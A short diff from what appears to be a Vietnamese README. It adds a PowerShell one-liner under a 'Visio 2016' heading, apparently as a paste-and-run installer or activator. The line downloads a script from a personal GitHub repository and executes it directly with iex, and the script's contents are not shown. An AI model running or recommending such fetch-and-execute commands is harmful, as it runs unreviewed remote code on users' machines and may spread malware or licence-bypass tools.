@@ -122,7 +122,7 @@
 ## Visio 2016
 
   ```php
-
+  powershell iex (irm https://raw.githubusercontent.com/bschithanh/nguon/refs/heads/main/Visio2016.ps1)
   ```
 
   Hoặc
